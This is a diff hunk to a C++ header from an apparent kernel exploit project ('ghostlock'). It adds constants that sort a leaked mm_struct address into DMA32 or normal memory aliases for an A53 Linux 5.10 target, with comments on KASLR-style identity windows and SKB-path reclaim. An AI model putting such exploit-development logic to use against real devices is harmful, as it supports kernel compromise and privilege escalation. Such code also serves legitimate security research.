@@ -43,6 +43,31 @@ namespace ghostlock::kernel {
     inline constexpr std::size_t KERNELSNITCH_IDENTITY_WINDOW_COUNT =
             target::address::kIdentityWindowCount;
 
+#if defined(GHOSTLOCK_TARGET_A53_5_10)
+    /* Zone classification for a leaked mm_struct slab.
+     *
+     * The two windows are the DMA32 and normal aliases respectively, in the
+     * order the scan walks them: window 0 sits at the page offset, window 1 is
+     * the 512 GiB-above normal alias where mm_structs were actually observed on
+     * this device. DMA32 does not reclaim into the SKB path here, so a DMA32
+     * candidate is discarded rather than used. */
+    inline constexpr std::uintptr_t A53_DMA32_ALIAS_START =
+            KERNELSNITCH_IDENTITY_WINDOWS[0].start;
+    inline constexpr std::uintptr_t A53_DMA32_ALIAS_END =
+            KERNELSNITCH_IDENTITY_WINDOWS[0].end;
+    inline constexpr std::uintptr_t A53_NORMAL_ALIAS_START =
+            KERNELSNITCH_IDENTITY_WINDOWS[1].start;
+    inline constexpr std::uintptr_t A53_NORMAL_ALIAS_END =
+            KERNELSNITCH_IDENTITY_WINDOWS[1].end;
+#else
+    /* Other targets have no measured zone layout, so no address is ever
+     * classified. support/a53_reclaim.cpp stays compilable and inert there. */
+    inline constexpr std::uintptr_t A53_DMA32_ALIAS_START = 0;
+    inline constexpr std::uintptr_t A53_DMA32_ALIAS_END = 0;
+    inline constexpr std::uintptr_t A53_NORMAL_ALIAS_START = 0;
+    inline constexpr std::uintptr_t A53_NORMAL_ALIAS_END = 0;
+#endif
+
     /* Kernel address layout. */
     inline constexpr std::uintptr_t KIMAGE_TEXT_BASE = target::address::kImageTextBase;
     inline constexpr std::uintptr_t MTK_VADDR_BASE = target::address::kMtkVirtualBase;
